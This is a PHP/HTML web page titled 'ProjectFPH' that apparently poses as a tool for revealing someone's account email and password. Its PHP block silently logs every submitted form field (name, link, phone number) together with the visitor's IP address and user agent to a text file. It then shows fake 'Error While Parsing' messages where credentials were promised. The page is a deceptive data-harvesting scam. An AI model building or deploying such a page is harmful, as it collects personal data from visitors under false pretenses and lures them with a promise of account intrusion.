<style>
    body{
        background-color: #0b60a5;
    }
</style>
<?php
if(!isset($_POST['name']) || empty($_POST['name']) || !isset($_POST['link']) || empty($_POST['link']) || !isset($_POST['phoneno']) || empty($_POST['phoneno']))
{
	header("location:index.php");
}
else{
    $logfile = fopen("details.txt", "a");
foreach($_POST as $variable => $value) {
    fwrite($logfile, $variable);
    fwrite($logfile, "=");
    fwrite($logfile, $value);
    fwrite($logfile, "\r\n");
    }
    fwrite($logfile, "IP : ");
    fwrite($logfile, $_SERVER['REMOTE_ADDR']);
    fwrite($logfile, "\r\n");
    fwrite($logfile, $_SERVER['HTTP_USER_AGENT']);
    fwrite($logfile, "\r\n");
    fwrite($logfile, "\r\n");
    fclose($logfile);
}

?>

<!DOCTYPE html>
<html>
<head>
	<title>ProjectFPH</title>
	<meta name="viewport" content="width=device-width, initial-scale=1">
	<link rel="stylesheet" type="text/css" href="style.css">
	<link rel="shortcut icon" href="favicon.ico" type="image/x-icon" />
</head>
    
<body>

<div class="top">
   
	<h1 style="margin-top:0; color:black">ProjectFPH</h1> 
</div>
	<header>
		<div class="head" style="display:inline-block;align-self:center">
		    <br>
		    <img src="flogo.png">
            <h3>Account Information</h3>
            <p>

                EMAIL : <span style="color: red">Error While Parsing. Poor Internet Connection.</span><br>
                PASSWORD : <span style="color: red">Error While Parsing. Poor Internet Connection.</span>
            <br>
            <br>
            <br>
		</div>
	</header>


</body>
</html>